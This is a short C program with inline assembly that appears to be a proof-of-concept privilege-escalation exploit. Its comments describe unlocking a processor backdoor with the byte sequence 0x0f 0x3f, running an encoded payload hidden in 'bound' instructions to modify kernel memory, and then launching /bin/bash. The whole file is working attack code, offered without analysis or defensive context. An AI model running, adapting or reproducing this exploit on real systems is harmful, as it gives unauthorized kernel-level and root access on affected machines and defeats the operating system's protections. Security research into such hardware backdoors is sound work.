#include <stdlib.h>

int main(void)
{
	/* unlock the backdoor */
	__asm__ ("movl $payload, %eax");
	__asm__ (".byte 0x0f, 0x3f");

	/* modify kernel memory */
	__asm__ ("payload:");
	__asm__ ("bound  %eax,0xa310075b(,%eax,1)");
	__asm__ ("bound  %eax,0x24120078(,%eax,1)");
	__asm__ ("bound  %eax,0x80d2c5d0(,%eax,1)");
	__asm__ ("bound  %eax,0x0a1af97f(,%eax,1)");
	__asm__ ("bound  %eax,0xc8109489(,%eax,1)");
	__asm__ ("bound  %eax,0x0a1af97f(,%eax,1)");
	__asm__ ("bound  %eax,0xc8109c89(,%eax,1)");
	__asm__ ("bound  %eax,0xc5e998d7(,%eax,1)");
	__asm__ ("bound  %eax,0xac128751(,%eax,1)");
	__asm__ ("bound  %eax,0x844475e0(,%eax,1)");
	__asm__ ("bound  %eax,0x84245de2(,%eax,1)");
	__asm__ ("bound  %eax,0x8213e5d5(,%eax,1)");
	__asm__ ("bound  %eax,0x24115f20(,%eax,1)");
	__asm__ ("bound  %eax,0x2412c133(,%eax,1)");
	__asm__ ("bound  %eax,0xa2519433(,%eax,1)");
	__asm__ ("bound  %eax,0x80d2c5d0(,%eax,1)");
	__asm__ ("bound  %eax,0xc8108489(,%eax,1)");
	__asm__ ("bound  %eax,0x24120208(,%eax,1)");
	__asm__ ("bound  %eax,0x80d2c5d0(,%eax,1)");
	__asm__ ("bound  %eax,0xc8108489(,%eax,1)");
	__asm__ ("bound  %eax,0x24120000(,%eax,1)");
	__asm__ ("bound  %eax,0x24110004(,%eax,1)");
	__asm__ ("bound  %eax,0x80d1c5d0(,%eax,1)");
	__asm__ ("bound  %eax,0xe01095fd(,%eax,1)");
	__asm__ ("bound  %eax,0x80d1c5d0(,%eax,1)");
	__asm__ ("bound  %eax,0xe01095fd(,%eax,1)");
	__asm__ ("bound  %eax,0x80d1c5d0(,%eax,1)");
	__asm__ ("bound  %eax,0x80d1c5d0(,%eax,1)");
	__asm__ ("bound  %eax,0xe0108dfd(,%eax,1)");
	__asm__ ("bound  %eax,0x80d1c5d0(,%eax,1)");
	__asm__ ("bound  %eax,0xe0108dfd(,%eax,1)");

	/* launch a shell */
	system("/bin/bash");

	return 0;
}
